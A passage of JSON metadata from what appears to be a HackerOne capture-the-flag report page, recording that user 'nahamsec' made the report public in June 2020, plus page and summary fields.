e,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-06-18T15:28:15.310Z","updated_at":"2020-06-18T15:28:15.310Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}